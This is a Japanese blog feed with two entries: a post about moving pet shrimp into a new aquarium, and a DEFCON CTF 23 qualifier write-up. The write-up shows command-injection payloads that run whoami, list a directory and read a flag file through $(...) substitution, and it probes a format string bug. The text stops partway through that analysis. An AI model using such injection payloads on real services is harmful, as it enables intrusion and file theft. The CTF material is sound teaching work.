<p>買いました。四角い水槽。</p>

<h1>買った物リスト</h1>

<p>観賞魚や鑑賞エビの通信販売大手であるCharmさんで2-3時間かけて慎重に選び、水槽とその他グッズを購入しました。</p>

<h2>水槽</h2>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.65897&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D65897"><img src="http://www.shopping-charm.jp/pic/658/65897-1.jpg" alt="グラステリア２５０　（２５×１７×２１）　２５ｃｍ水槽（単体）" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.65897&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D65897">グラステリア２５０　（２５×１７×２１）　２５ｃｍ水槽（単体）</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B004HCLJWK/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B004HCLJWK&amp;linkCode=as2&amp;tag=mzyy-22">ジェックス グラステリア 250</a></li>
</ul>


<p>水槽はサイズを迷いましたが25cm水槽を購入しました。小さなエビにとっては15cm水槽や20cm水槽でも十分広いだろうと思いましたが、万一汽水が蒸発した時の塩分濃度変化が少ないだろうと踏み、少し大き目を購入しました。</p>

<h2>砂利</h2>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.161847&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D161847"><img src="http://www.shopping-charm.jp/pic/161/161847-1.jpg" alt="アクアクリスタルサンド　ブルー　５００ｇ" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.161847&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D161847">アクアクリスタルサンド　ブルー　５００ｇ</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00U5OY94O/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00U5OY94O&amp;linkCode=as2&amp;tag=mzyy-22">アクアクリスタルサンド　ブルー　５００ｇ</a></li>
</ul>


<p>槽が広くなるため、今までの砂利では足りないと感じたため、同じ色の砂利を購入しました。</p>

<h2>フィルター&amp;ポンプ</h2>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.170800&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D170800"><img src="http://www.shopping-charm.jp/pic/170/170800-1.jpg" alt="水作　ボトムフィルター　ミニ（ハーフプレート２枚入り）底面フィルター" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.170800&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D170800">水作　ボトムフィルター　ミニ（ハーフプレート２枚入り）底面フィルター</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00XA2NGP6/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00XA2NGP6&amp;linkCode=as2&amp;tag=mzyy-22">水作 水作ボトムフィルター ミニ</a></li>
</ul>


<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.14310&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D14310"><img src="http://www.shopping-charm.jp/pic/143/14310-1.jpg" alt="ノンノイズ　Ｓ－１００　～３０ｃｍ水槽用エアーポンプ" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.14310&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D14310">ノンノイズ　Ｓ－１００　～３０ｃｍ水槽用エアーポンプ</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B0050NIM7U/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B0050NIM7U&amp;linkCode=as2&amp;tag=mzyy-22">ノンノイズS-100</a></li>
</ul>


<p>一般的な形の水槽に変わったため、水質変化維持のためのフィルターをつける余地が出てきました。
フィルターにはいくつか種類があり、壁掛け式や底面式などがあります。
壁掛け式では水中から水を吸い込み、フィルターで濾して水槽内へ排出する仕組み上、小さくえびが吸い込まれてしまう危険があります。
対して底面式では、砂利の下にある水を吸い上げフィルターで濾すため、その危険は格段に低くなります。
迷うことなく後者の底面フィルター式を購入しました。
ポンプは水をフィルター内に循環させるために用います。</p>

<h2>水草</h2>

<p>せっかく大きな水槽になるのに装飾品がそのままでは少し物寂しいと思ったので、水草をいくつか追加しました。</p>

<h3>ウィローモス</h3>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.12828&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D12828"><img src="http://www.shopping-charm.jp/pic/128/12828-1.jpg" alt="（水草）ウィローモス（無農薬）（１パック）" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.12828&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D12828">（水草）ウィローモス（無農薬）（１パック）</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF4A3QW/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF4A3QW&amp;linkCode=as2&amp;tag=mzyy-22">（水草）ウィローモス（無農薬）（１パック）　北海道航空便要保温</a></li>
</ul>


<p>これは前の記事にも書きましたが、汽水でも多分育つ藻です。
えびの足場となったり食べ物になったりします。</p>

<h3>アヌビアス・ナナ</h3>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.431211&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D431211"><img src="http://www.shopping-charm.jp/pic/431/431211-1.jpg" alt="（水草）組織培養　ライフマルチ　アヌビアス　ナナ（無農薬）（１個）" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.431211&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D431211">（水草）組織培養　ライフマルチ　アヌビアス　ナナ（無農薬）（１個）</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF485KI/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF485KI&amp;linkCode=as2&amp;tag=mzyy-22">（水草）組織培養　ライフマルチ　アヌビアス　ナナ（無農薬）（１個）　北海道航空便要保温</a></li>
</ul>


<p>他に汽水でも育つかもしれない水草はないかと調べていたところ、<a href="http://eightmillion.net/255/">汽水域で育つ(塩分に強い)水草 超水草図鑑エイトミリオン(アクアリウム・水草の育て方・水草水槽レイアウト・水草の増やし方)</a>にて紹介されている水草の中で見た目が気に入ったものがこれです。
主に色目のために入れます。</p>

<h2>汽水</h2>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.503740&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D503740"><img src="http://www.shopping-charm.jp/pic/503/503740-1.jpg" alt="（海水）足し水くん　汽水　２．８Ｌ" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.503740&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D503740">（海水）足し水くん　汽水　２．８Ｌ</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF458AS/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF458AS&amp;linkCode=as2&amp;tag=mzyy-22">（海水）足し水くん　天然海水「クリオネ水」（海洋深層水）　２．８リットル</a></li>
</ul>


<p>水槽がいままでのものより大きくなるため追加の水が必要ですが、汽水であるため、そのままの水道水は使えません。
汽水としてあらかじめ濃度が調節されているものが売られていたので、これを5.6リットル購入しました。</p>

<h1>引越し完了</h1>

<h2>Before</h2>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">2015年6月16日現在のえび飼育装置全貌 <a href="http://t.co/yKWdfrhbUH">pic.twitter.com/yKWdfrhbUH</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/610789625393647616">2015, 6月 16</a></blockquote>


<h2>After</h2>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">2015年6月20日現在のえび飼育装置全貌 <a href="http://t.co/oCNNERkua0">pic.twitter.com/oCNNERkua0</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/612252163058745344">2015, 6月 20</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">引っ越し完了！ <a href="http://t.co/ms1wCAqxyz">pic.twitter.com/ms1wCAqxyz</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/612251688510976000">2015, 6月 20</a></blockquote>


<h1>まとめ</h1>

<p>えびかわいい</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DEFCON CTF 23予選 Write-up (解説付き(すこし))]]></title>
    <link href="http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup/"/>
    <updated>2015-05-18T23:45:04+09:00</updated>
    <id>http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup</id>
    <content type="html"><![CDATA[<p>今年のDEFCON CTFの予選が5月16日午前9時から48時間開催されていました。今回はチーム********としての参加ではなく、Team Enuに派遣される形で参加してきました。</p>

<p>今年は、比較的やさしいBaby&#8217;s First問題とPwn問題、リバースエンジニアリングのジャンルに属する問題が各数問あり、加えてWebとCoding Challengeが1問ずつありました。
複数ある問題の中でFlagをsubmitしたのは1問だけですが、いくつか正解までたどり着くところまで解けたのでWrite-upを記します。</p>

<!-- more -->


<h1>Babycmd</h1>

<h2>問題文</h2>

<pre><code>babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me:15491

[Download](http://downloads.notmalware.ru/babycmd_3ad28b10e8ab283d7df81795075f600b)
</code></pre>

<h2>問題</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: </span></code></pre></td></tr></table></div></figure>


<p>pingとhostとdigコマンドが実行できるアプリケーションにアクセスして、どうにかしてflagを獲得する問題。
逆アセンブルした結果、<em>コマンド[スペース]引数</em>として標準入力から渡すと、コマンドが( dig | ping | host | exit | help )かどうかで分岐し、引数が適切であるか、またIPアドレスかどうかをチェックし、コマンドをpopen経由で実行しているものでした。
<code>strings</code>コマンドと<code>grep</code>で<em>%s</em>がある記述を探したところ、各コマンドは引数がIPアドレスなのかそれ以外かで分岐し、</p>

<table>
<thead>
<tr>
<th>タイプ </th>
<th> 実行コマンド</th>
</tr>
</thead>
<tbody>
<tr>
<td>dig (IPアドレス）</td>
<td> <code>dig -x 引数</code></td>
</tr>
<tr>
<td>dig（文字列）</td>
<td><code>dig '引数'</code></td>
</tr>
<tr>
<td>ping（IPアドレスのみ）</td>
<td><code>ping -c 3 -W 3 引数</code></td>
</tr>
<tr>
<td>host（IPアドレス）</td>
<td><code>host 引数</code></td>
</tr>
<tr>
<td>host（文字列）</td>
<td><code>host "引数"</code></td>
</tr>
</tbody>
</table>


<p>としてpopenで実行されるようになっていました。</p>

<p>適当にPublic DNS宛にPingを送ってみると以下のような表示になりました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: ping 8.8.8.8
</span><span class='line'>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
</span><span class='line'>64 bytes from 8.8.8.8: icmp_req=1 ttl=128 time=9.51 ms
</span><span class='line'>64 bytes from 8.8.8.8: icmp_req=2 ttl=128 time=9.53 ms
</span><span class='line'>64 bytes from 8.8.8.8: icmp_req=3 ttl=128 time=9.95 ms
</span><span class='line'>
</span><span class='line'>--- 8.8.8.8 ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0 0x7fffd2999630acket loss, time 2005ms
</span><span class='line'>rtt min/avg/max/mdev = 9.515/9.667/9.956/0.219 ms
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>pingの出力結果に含まれる<strong>% Packet</strong>が、フォーマット文字列の<em>%p</em>として解釈され、アドレスが表示されていることがわかりました。format string attack(後述)として攻められるような感じがしましたが、他の人が取り組んでいるようなので違う方法でアプローチをしていくことにしました。</p>

<p>digとhostに文字列を渡した時の括りがそれぞれ違うことに注目しました。digではシングルクオートで、hostではダブルクオートでくくって引数を渡しています。
シェル上では、ダブルクオートの文字列の中で変数を展開できます。<code>echo "$SHELL"</code>とすると<em>/bin/bash</em>と出力されるのがいい例です。今回の問題の場合は、<code>host $SHELL</code>として標準入力から渡すと、<code>host "/bin/bash"</code>として実行されると考えられます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host $PWD
</span><span class='line'>Invalid hostname.
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>しかしながら、試しに<code>host $PWD</code>として打ってみたところ、引数チェックで引っかかり、<em>popen</em>で実行されませんでした。</p>

<p>逆コンパイルの結果、引数チェックでは最初と最後の文字が数字もしくはアルファベットでない場合にエラーとして実行させないようにしていることがわかったので、<code>host A${PWD}A</code>として実行してみました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host $PWD
</span><span class='line'>Invalid hostname.
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host A${PWD}A
</span><span class='line'>Host A/A not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>変数展開されていることが確認できました。/ディレクトリがカレントディレクトリのようです。</p>

<h2>攻撃手法：OSコマンド インジェクション</h2>

<p>これができることがわかると、次に挑戦したくなるのは変数中のコマンド展開によるOSコマンド インジェクションです。
コマンド展開とは、ダブルクオート中に変数を展開するのと同じ要領で、<em>$(コマンド)</em>としてコマンドを実行し、文字列中にコマンドの出力を展開するものです。例として、<code>echo "$(uname)"</code>とすると<em>Linux</em>と返ってきます。これを用いて実行中のユーザーを確認します。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host A$(whoami)A
</span><span class='line'>Host AbabycmdA not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>babycmdユーザーとして実行されていることがわかりました。
そこで、ホームディレクトリ内のファイル一覧を取得してみることにしました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host A$(ls /home/babycmd)A
</span><span class='line'>sh: 1: ls/home/babycmd: not found
</span><span class='line'>Host AA not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>引数に渡される文字列に含まれるスペースが削られるようです。タブで代用してみました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host A$(ls    /home/babycmd)A
</span><span class='line'>Host Ababycmd
</span><span class='line'>flagA not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit</span></code></pre></td></tr></table></div></figure>


<p>ホームディレクトリにbabycmdとflagというファイルがあることがわかりました。
catのリダイレクトでflagを抜いてしまいます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:  host A$(cat&lt;/home/babycmd/flag)A
</span><span class='line'>Host AThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??A not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>FLAG:<code>Pretty easy eh!!~ Now let's try something hArd3r, shallwe??</code></p>

<p>OSコマンドインジェクションに関連する脆弱性対策をIPAが公開してくれているので、CTFのためにも自衛のためにも一度目を通しておくことをお勧めします。</p>

<p><a href="http://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/c909.html">IPA ISEC　セキュア・プログラミング講座：C/C++言語編　第10章 著名な脆弱性対策：コマンド注入攻撃対策</a></p>

<h1>Babyecho</h1>

<h2>問題文</h2>

<pre><code>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me:3232

[Download](http://downloads.notmalware.ru/babyecho_eb11fdf6e40236b1a37b7974c53b6c3d)
</code></pre>

<h2>問題</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>


<p>標準入力で待ち受けしているので、文字列を送ると標準出力に<del>そのまま</del><em>的確に</em>返してくれるプログラムにアクセスしてflagを得る問題です。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes
</span><span class='line'>%p.%p.%p.%p
</span><span class='line'>0xd.0xa.(nil).0xd
</span><span class='line'>Reading 13 bytes
</span><span class='line'>0123456789abcdef
</span><span class='line'>0123456789ab
</span><span class='line'>Reading 13 bytes
</span><span class='line'>def
</span><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>


<p>フォーマット文字列が使えて、12文字を越えると次の入力として処理されるようです。</p>

<p>バイナリを<code>strings</code>コマンドでみてみると、入力待ちの直前に表示されている<em>Reading 13 bytes</em>の13という数字は可変であることがわかります。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ strings ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d | grep Reading
</span><span class='line'>Reading %d bytes</span></code></pre></td></tr></table></div></figure>


<p>フォーマット文字列を使ってスタックの中身をもうすこしみてみます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes
</span><span class='line'>AAAA%5$p
</span><span class='line'>AAAA0xffea839c
</span><span class='line'>Reading 13 bytes
</span><span class='line'>AAAA%6$p
</span><span class='line'>AAAA(nil)
</span><span class='line'>Reading 13 bytes
</span><span class='line'>AAAA%7$p
</span><span class='line'>AAAA0x41414141
</span><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>


<p><em>AAAA%7$p</em>を渡した状態の時、以下のようにスタック(esp)に積まれていることがわかります。</p>

<p><svg width="300" height="400" style="background-color: #fff">
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x41414141</tspan>
</text>
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
</svg></p>

<p>esp+0x1cの位置から標準入力の値の格納バッファーが確保されているようです。</p>

<p>先ほど調査したスタックをみてみると、読み込みバイト数らしき13(=0x0000000d)が2箇所積まれているのがわかります。
IDA pro (demo)で入力待ちになるときの直前の処理を追ってみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/05/18/babyecho-debugging.png" alt="IDA pro demo debugging" /></p>

<p>この入力と出力を繰り返すループ(0x08048FB6)の直前の処理で、サイズ0x420のスタックを用意し、スタック内の値をいくつかセットしているところがあります。この値のセットで、esp+0x14にesp+0x1cのアドレスをセットしている部分があります(0x08048f57)。esp+0x1cは、先ほどの調査より標準入力の値が格納されるバッファーの開始位置です。このことから、先ほど<em>AAAA%5$p</em>を入力して返ってきた値<em>0xffea839c</em>は、標準入力からの値を格納するバッファーのアドレスを指しているということになります。</p>

<p>loc_8048fb6のループを見てみると、&#8221;Reading %d bytes\n&#8221;で表示されるバイト数をesp+0x10からesp+0x04にコピーしている処理があります(0x08048fcc)。printfで&#8221;Reading %d bytes\n&#8221;を表示した後、 esp+0x08に0x0aを入れ、標準入力からの読み取り上限をesp+0x10からesp+0x04にコピーしてセットし、esp+0x1cに標準入力からの値を読み取っています。</p>

<p><svg width="640" height="400" style="background-color: #fff">
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
</text>
</g>
